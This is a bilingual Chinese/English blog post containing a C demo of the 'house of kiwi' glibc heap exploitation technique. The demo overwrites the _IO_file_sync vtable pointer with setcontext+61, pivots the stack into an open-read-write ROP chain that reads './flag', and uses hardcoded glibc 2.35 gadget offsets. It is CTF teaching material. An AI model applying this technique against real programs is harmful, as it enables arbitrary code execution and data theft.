这是笔者写的house of kiwi示例程序，需要在ubuntu 22.04上编译运行。本程序改编自[https://www.anquanke.com/post/id/235598](https://www.anquanke.com/post/id/235598)的demo程序，其中说明了house of kiwi的利用流程。house of kiwi的利用与house of emma类似，利用链更短，也更好理解一些。

若程序在运行过程中出现任何非预期情况，请及时与笔者联系，以便及时进行修改。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#define pop_rdi_ret libc_base + 0x000000000002a3e5
#define pop_rdx_r12 libc_base + 0x000000000011f497
#define pop_rsi_ret libc_base + 0x000000000002be51
#define pop_rax_ret libc_base + 0x0000000000045eb0
#define syscall_ret libc_base + 0x0000000000091396
#define ret pop_rdi_ret+1
size_t libc_base;
size_t ROP[0x30];
char FLAG[0x100] = "./flag\x00";

int main() {
    setvbuf(stdin,0LL,2,0LL);
    setvbuf(stdout,0LL,2,0LL);
    puts("\033[32mHello there! Today let's learn something about house of kiwi.\033[0m");
    puts("\033[32m本程序演示house of kiwi的利用流程。\033[0m");
    puts("\033[1;32mModified from demo in https://www.anquanke.com/post/id/235598.\033[0m");
    puts("\033[1;32m改编自https://www.anquanke.com/post/id/235598的demo程序。\033[0m");
    puts("\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m");
    puts("\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m");
    
    puts("\033[32mFirst let's make clear how to exploit.\033[0m");
    puts("\033[32m首先让我们搞清楚这种利用方式是如何工作的。\033[0m");
    puts("\033[32mSame as house of emma, house of kiwi has a stable call chain.\033[0m");
    puts("\033[32m与house of emma相同，house of kiwi有一条稳定的函数调用链。\033[0m");
    puts("\033[32mIt started with function sysmalloc, which can be triggered when we need top chunk.\033[0m");
    puts("\033[32m这条调用链开始于sysmalloc函数，可以通过向top chunk分配chunk来触发该函数。\033[0m");
    
    puts("\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m");
    puts("\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m");
    puts("\033[33m(line 2617, /malloc/malloc.c)\033[0m");
    puts("\033[34m  assert ((old_top == initial_top (av) && old_size == 0) ||\n"
         "          ((unsigned long) (old_size) >= MINSIZE &&\n"
         "           prev_inuse (old_top) &&\n"
         "           ((unsigned long) old_end & (pagesize - 1)) == 0));\n\033[0m");
    puts("\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m");
    puts("\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m");
    puts("\033[32mBecause in malloc.c there is a #define statement: \033[0m");
    puts("\033[32m因为在malloc.c中有一个#define语句: \n\033[0m");
    puts("\033[33m(line 292, /malloc/malloc.c)\033[0m");
    puts("\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n"
         "\t __malloc_assert(assertion, file, line, function)\n\033[0m");
    puts("\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m");
    puts("\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m");

    puts("\033[32mThe content of function __malloc_assert is: \033[0m");
    puts("\033[32m__malloc_assert函数的内容为: \033[0m");
    puts("\033[33m(line 297, /malloc/malloc.c)\033[0m");
    puts("\033[34mstatic void\n"
         "__malloc_assert (const char *assertion, const char *file, unsigned int line,\n"
         "\t\t const char *function)\n"
         "{\n"
         "  (void) __fxprintf (NULL, \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n\",\n"
         "\t\t     __progname, __progname[0] ? \": \" : \"\",\n"
         "\t\t     file, line,\n"
         "\t\t     function ? function : \"\", function ? \": \" : \"\",\n"
         "\t\t     assertion);\n"
         "  fflush (stderr);\n"
         "  abort ();\n"
         "}\033[0m\n");
         
    puts("\033[32mWhile in function fflush, it will jump to a function, and that is our chance.\033[0m");
    puts("\033[32m函数fflush中会跳转到另一个函数，这就是我们利用的机会。\033[0m");
    puts("\033[32mLet's have a look at function fflush:\033[0m");
    puts("\033[32m让我们看一下fflush的内容：\033[0m");
    puts("\033[33m(line 33, /assert/assert.c)\033[0m");
    puts("\033[34m#define fflush(s) _IO_fflush (s)\033[0m");
    puts("\033[33m(line 30, /libio/iofflush.c)\033[0m");
    puts("\033[34mint\n"
         "_IO_fflush (FILE *fp)\n"
         "{\n"
         "  if (fp == NULL)\n"
         "    return _IO_flush_all ();\n"
         "  else\n"
         "    {\n"
         "      int result;\n"
         "      CHECK_FILE (fp, EOF);\n"
         "      _IO_acquire_lock (fp);\n"
         "      \033[1;31mresult = _IO_SYNC (fp) ? EOF : 0;\033[34m\n"
         "      _IO_release_lock (fp);\n"
         "      return result;\n"
         "    }\n"
         "}\033[0m");

    puts("\033[32mPlease pay attention to the red code, here is its disassembly result:\033[0m");
    puts("\033[32m注意标红的代码，下面是这段代码的反汇编结果（pwndbg调试界面部分截取）\033[0m");
    puts("\033[34m   0x7ffff7e00208 <__GI__IO_fflush+88>:\t\033[1;31mlea    rdx,[rip+0x1967f1]        # 0x7ffff7f96a00 <_IO_helper_jumps>\033[34m\n"
         "   0x7ffff7e0020f <__GI__IO_fflush+95>:\tlea    rax,[rip+0x197552]        # 0x7ffff7f97768\n"
         "   0x7ffff7e00216 <__GI__IO_fflush+102>:\tsub    rax,rdx\n"
         "   0x7ffff7e00219 <__GI__IO_fflush+105>:\tmov    rcx,rbp\n"
         "   0x7ffff7e0021c <__GI__IO_fflush+108>:\tsub    rcx,rdx\n"
         "   0x7ffff7e0021f <__GI__IO_fflush+111>:\tcmp    rax,rcx\n"
         "   0x7ffff7e00222 <__GI__IO_fflush+114>:\tjbe    0x7ffff7e00268 <__GI__IO_fflush+184>\n"
         "   0x7ffff7e00224 <__GI__IO_fflush+116>:\tmov    rdi,rbx\n"
         "   0x7ffff7e00227 <__GI__IO_fflush+119>:\t\033[1;31mcall   QWORD PTR [rbp+0x60]\033[34m\n"
         "   0x7ffff7e0022a <__GI__IO_fflush+122>:\tneg    eax\n"
         "   0x7ffff7e0022c <__GI__IO_fflush+124>:\tsbb    r12d,r12d\n"
         "   0x7ffff7e0022f <__GI__IO_fflush+127>:\ttest   DWORD PTR [rbx],0x8000\n"
         "   0x7ffff7e00235 <__GI__IO_fflush+133>:\tjne    0x7ffff7e00258 <__GI__IO_fflush+168>\n"
         "   0x7ffff7e00237 <__GI__IO_fflush+135>:\tmov    rdi,QWORD PTR [rbx+0x88]\n"
         "   0x7ffff7e0023e <__GI__IO_fflush+142>:\tmov    eax,DWORD PTR [rdi+0x4]\n"
         "   0x7ffff7e00241 <__GI__IO_fflush+145>:\tsub    eax,0x1\n"
         "   0x7ffff7e00244 <__GI__IO_fflush+148>:\tmov    DWORD PTR [rdi+0x4],eax\n"
         "   0x7ffff7e00247 <__GI__IO_fflush+151>:\tjne    0x7ffff7e00258 <__GI__IO_fflush+168>\n"
         "   0x7ffff7e00249 <__GI__IO_fflush+153>:\tmov    QWORD PTR [rdi+0x8],0x0\n\033[0m");

    puts("\033[32mAs you can see, it calls [rbp+0x60], let's execute the code until there...\033[0m");
    puts("\033[32m可以看到这里call了[rbp+0x60]，我们调试到这里看一下rbp的值...\033[0m");
    puts("\033[1;33m R14  0x1000\n"
         " R15  0xff\n"
         "*RBP  0x7ffff7f97600 (_IO_file_jumps) ◂— 0x0\n"
         "*RSP  0x7fffffffdc60 —▸ 0x7ffff7f9ac80 (main_arena) ◂— 0x0\n"
         "*RIP  0x7ffff7e00227 (fflush+119) ◂— call   qword ptr [rbp + 0x60]\n\033[0m");
    puts("\033[32mThe rbp points to a struct called _IO_file_jumps, let's see what it looks like in IDA:\033[0m");
    puts("\033[32mrbp指向了一个名为_IO_file_jumps的结构，看一下它在IDA中的内容：\033[0m");
    puts("\033[34m__libc_IO_vtables:0000000000216600 _IO_file_jumps  dq 0                    ; DATA XREF: LOAD:0000000000014598↑o\n"
         "__libc_IO_vtables:0000000000216600                                         ; sub_29CA0+B↑o ...\n"
         "__libc_IO_vtables:0000000000216608                 dq 0\n"
         "__libc_IO_vtables:0000000000216610                 dq offset _IO_file_finish\n"
         "__libc_IO_vtables:0000000000216618                 dq offset _IO_file_overflow\n"
         "__libc_IO_vtables:0000000000216620                 dq offset _IO_file_underflow\n"
         "__libc_IO_vtables:0000000000216628                 dq offset _IO_default_uflow\n"
         "__libc_IO_vtables:0000000000216630                 dq offset _IO_default_pbackfail\n"
         "__libc_IO_vtables:0000000000216638                 dq offset _IO_file_xsputn\n"
         "__libc_IO_vtables:0000000000216640                 dq offset sub_8B330\n"
         "__libc_IO_vtables:0000000000216648                 dq offset _IO_file_seekoff\n"
         "__libc_IO_vtables:0000000000216650                 dq offset sub_8E530\n"
         "__libc_IO_vtables:0000000000216658                 dq offset _IO_file_setbuf\n"
         "\033[1;31m__libc_IO_vtables:0000000000216660                 dq offset _IO_file_sync\033[34m\n"
         "__libc_IO_vtables:0000000000216668                 dq offset _IO_file_doallocate\n"
         "__libc_IO_vtables:0000000000216670                 dq offset _IO_file_read\n"
         "__libc_IO_vtables:0000000000216678                 dq offset _IO_file_write\n"
         "__libc_IO_vtables:0000000000216680                 dq offset _IO_file_seek\n"
         "__libc_IO_vtables:0000000000216688                 dq offset _IO_file_close\n"
         "__libc_IO_vtables:0000000000216690                 dq offset _IO_file_stat\n"
         "__libc_IO_vtables:0000000000216698                 dq offset sub_8F4A0\n"
         "__libc_IO_vtables:00000000002166A0                 dq offset sub_8F4B0\n"
         "__libc_IO_vtables:00000000002166A8                 align 20h\033[0m");

    puts("\033[32mSo it actually calls the function _IO_file_sync.\033[0m");
    puts("\033[32m因此这里实际上是在调用_IO_file_sync函数。\033[0m");
    puts("\033[32mHouse of kiwi just changed the value there to anywhere we want.\033[0m");
    puts("\033[32mhouse of kiwi实际上就是将这里的值进行修改。\033[0m");
    puts("\033[32mIn CTF problems, we usually changed it into setcontext+61 to trigger stack pivoting.\033[0m");
    puts("\033[32m在CTF赛题中，我们一般将这里的值修改为setcontext+61来触发栈迁移。\033[0m");
    puts("\033[32mBut there is one thing to notice, if you use command 'vmmap' in pwndbg,\033[0m");
    puts("\033[32m但这里有一点需要注意，如果在pwndbg中使用vmmap命令，\033[0m");
    puts("\033[32mYou will find that the page where _IO_file_jumps is located in was not able to write.\033[0m");
    puts("\033[32m你会发现_IO_file_jumps所在的页并不具有写权限（这一点笔者在其他有关house of kiwi的文章中并没有找到原因，不知为何）\033[0m");
    puts("\033[32mSo we had better change the privilege of that page through function mprotect().\033[0m");
    puts("\033[32m因此我们最好使用mprotect函数来修改一下这一页的访问权限。\033[0m\n");
    puts("\033[32mThen, let's have a look at rdx, which is a key register for stack pivoting.\033[0m");
    puts("\033[32m然后我们注意一下rdx寄存器的值，这是我们进行栈迁移的关键寄存器。\033[0m");
    puts("\033[32mHave a look at disassembly result of function setcontext: \033[0m");
    puts("\033[32m看一下setcontext函数的汇编: \033[0m");
    puts("\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n"
         ".text:0000000000053A74                 mov     rbx, [rdx+80h]\n"
         ".text:0000000000053A7B                 mov     rbp, [rdx+78h]\n"
         ".text:0000000000053A7F                 mov     r12, [rdx+48h]\n"
         ".text:0000000000053A83                 mov     r13, [rdx+50h]\n"
         ".text:0000000000053A87                 mov     r14, [rdx+58h]\n"
         ".text:0000000000053A8B                 mov     r15, [rdx+60h]\n"
         ".text:0000000000053A8F                 test    dword ptr fs:48h, 2\n"
         ".text:0000000000053A9B                 jz      loc_53B56\n"
         "\t\t\t......\n"
         ".text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n"
         ".text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n"
         ".text:0000000000053B5E                 mov     rsi, [rdx+70h]\n"
         ".text:0000000000053B62                 mov     rdi, [rdx+68h]\n"
         ".text:0000000000053B66                 mov     rcx, [rdx+98h]\n"
         ".text:0000000000053B6D                 mov     r8, [rdx+28h]\n"
         ".text:0000000000053B71                 mov     r9, [rdx+30h]\n"
         ".text:0000000000053B75                 mov     rdx, [rdx+88h]\n"
         ".text:0000000000053B75 ; } // starts at 53A30\n"
         ".text:0000000000053B7C ; __unwind {\n"
         ".text:0000000000053B7C                 xor     eax, eax\n"
         ".text:0000000000053B7E                 retn\033[0m");
    puts("\033[32mYou can see the rsp was changed into [rdx+0xA0]\033[0m");
    puts("\033[32m你可以看到rsp被修改为[rdx+0xA0]的值。\033[0m");
    puts("\033[32mWhen calling _IO_file_sync, the value of rdx is actually the address of _IO_helper_jumps.\033[0m");
    puts("\033[32m在call _IO_file_sync时，rdx的值实际上是_IO_helper_jumps的地址。\033[0m");
    puts("\033[32mThis value is stable and it's right above _IO_file_jumps:\033[0m");
    puts("\033[32m这个值是稳定不变的，实际上这个结构体的地址就在_IO_file_jumps前面一点:\033[0m");
    puts("\033[34m__libc_IO_vtables:0000000000215A00 qword_215A00    dq 0                    ; DATA XREF: sub_45390+1A3↑o\n"
         "__libc_IO_vtables:0000000000215A00                                         ; sub_5A980+1643↑o ...\n"
         "__libc_IO_vtables:0000000000215A08                 dq 0\n"
         "__libc_IO_vtables:0000000000215A10                 dq offset _IO_default_finish\n"
         "__libc_IO_vtables:0000000000215A18                 dq offset sub_722E0\n"
         "__libc_IO_vtables:0000000000215A20                 dq offset sub_8DDD0\n"
         "__libc_IO_vtables:0000000000215A28                 dq offset _IO_default_uflow\n"
         "......\033[0m\n");

    puts("\033[32mSo that we need to change the value of [rdx+0xA0] and [rdx+0xA8] to complete ROP chain.\033[0m");
    puts("\033[32m因此我们需要修改[rdx+0xA0]和[rdx+0xA8]的值来构建ROP链。\n\033[0m");

    puts("\033[32mNow we are going to have a try.\033[0m");
    puts("\033[32m现在就让我们来演示一下。\033[0m");
    puts("\033[32mFirst we get the libc base through function setvbuf, which has the offset of 0x81670 in this libc.\033[0m");
    puts("\033[32m首先我们通过setvbuf函数获取libc加载基址，setvbuf函数在本libc中的偏移为0x81670。\033[0m");

    libc_base  = ((size_t)setvbuf) - 0x81670;
    printf("\033[1;31mLIBC: %#lx\n\033[0m", libc_base);

    printf("\033[32mThen we use mprotect function to add write privilege in address %p to %p.\n\033[0m",
           (void*)(libc_base + 0x215000), (void*)(libc_base + 0x217000));
    printf("\033[32m然后我们将 %p 到 %p 的地址空间添加写权限。\n\033[0m",
           (void*)(libc_base + 0x215000), (void*)(libc_base + 0x217000));
    mprotect((void*)(libc_base + 0x215000), 0x2000, PROT_READ | PROT_WRITE);

    size_t magic_gadget = libc_base + 0x53A30 + 61; // setcontext + 61
    printf("\033[1;32mThen we get address of setcontext+61, which has offset of 0x53A30 + 61: %#zx\n\033[0m", magic_gadget);
    printf("\033[1;32m然后我们获取到setcontext+61的地址，其相对于libc基址的偏移为0x53A30 + 61: %#zx\n\033[0m", magic_gadget);
    size_t _IO_helper_jumps = libc_base + 0x215A00; // _IO_helper_jumps
    printf("\033[1;32mNext is the address of _IO_helper_jumps, which has offset of 0x215A00: %#zx\n\033[0m", _IO_helper_jumps);
    printf("\033[1;32m接下来是_IO_helper_jumps的地址，其相对于libc基址的偏移为0x215A00: %#zx\n\033[0m", _IO_helper_jumps);
    size_t _IO_file_sync = libc_base + 0x216660; // sync pointer in _IO_file_jumps
    printf("\033[1;32mNext is the address of _IO_file_sync, which has offset of 0x216660: %#zx\n\033[0m", _IO_file_sync);
    printf("\033[1;32m接下来是_IO_file_sync的地址，其相对于libc基址的偏移为0x216660: %#zx\n\033[0m", _IO_file_sync);

    puts("\033[32mThen let's construct our ROP chain of orw. The ROP chain will be placed in bss segment.\033[0m");
    puts("\033[32m然后我们就来构造ROP链，用于orw。ROP链会放在bss段中。\033[0m");
    puts("\033[32mUseful gadgets:\033[0m");
    puts("\033[32m有用的gadget：（不同libc下的偏移可能不同，如果在不同libc下测试注意修改）\033[0m");
    printf("\033[1;31mpop rax ; ret: %#zx\n\033[0m", pop_rax_ret);
    printf("\033[1;31mpop rdi ; ret: %#zx\n\033[0m", pop_rdi_ret);
    printf("\033[1;31mpop rsi ; ret: %#zx\n\033[0m", pop_rsi_ret);
    printf("\033[1;31msyscall ; ret: %#zx\n\033[0m", syscall_ret);
    printf("\033[1;31mpop rdx ; pop r12 ; ret: %#zx\n\n\033[0m", pop_rdx_r12);

    uint32_t i = 0;
    ROP[i++] = pop_rax_ret;
    ROP[i++] = 2;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = (size_t)FLAG;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = 0;
    ROP[i++] = syscall_ret;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 3;
    ROP[i++] = pop_rdx_r12;
    ROP[i++] = 0x100;
    ROP[i++] = 0;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = (size_t)(FLAG + 0x10);
    ROP[i++] = (size_t)read;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 1;
    ROP[i++] = (size_t)write;

    puts("\033[32mROP chain constructed, then we need to change the value of [rdx+0xA0] and [rdx+0xA8].\033[0m");
    puts("\033[32mROP链构造完成，下面我们需要修改[rdx+0xA0]和[rdx+0xA8]的值了。\033[0m");
    puts("\033[32mWe need to let [_IO_helper_jumps+0xA0] = ROP chain address, and [_IO_helper_jumps+0xA8] = address of instruction \"ret\"\033[0m");
    puts("\033[32m我们需要让[_IO_helper_jumps+0xA0]等于ROP链的地址，[_IO_helper_jumps+0xA8]等于一条ret指令的地址。\"ret\"\033[0m");
    puts("\033[32mThis is basic knowledge you need to know when using setcontext to pivot your stack.\033[0m");
    puts("\033[32m这是使用setcontext进行栈迁移的基本操作。\033[0m");
    *((size_t*)_IO_helper_jumps + 0xA0/8) = (size_t)ROP; // 设置rsp
    *((size_t*)_IO_helper_jumps + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址
    puts("\033[32mThen we let _IO_file_sync pointer = setcontext + 61.\033[0m");
    puts("\033[32m然后我们让_IO_file_sync指针的值等于setcontext+61，以触发栈迁移。\033[0m");
    *((size_t*)_IO_file_sync) = magic_gadget; // 设置fflush(stderr)中调用的指令地址
    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert
    puts("\033[32mNext we need to change the size of top chunk to let the assert fail.\033[0m");
    puts("\033[32m然后我们修改top chunk的大小让断言失败。\033[0m");
    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);
    *top_size = (*top_size)&0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在
    puts("\033[32mThe last step: malloc a big space.\033[0m");
    puts("\033[32m最后一步：malloc一块大空间。\033[0m");
    malloc(0x1000); // 触发assert
    _exit(-1);
}
```
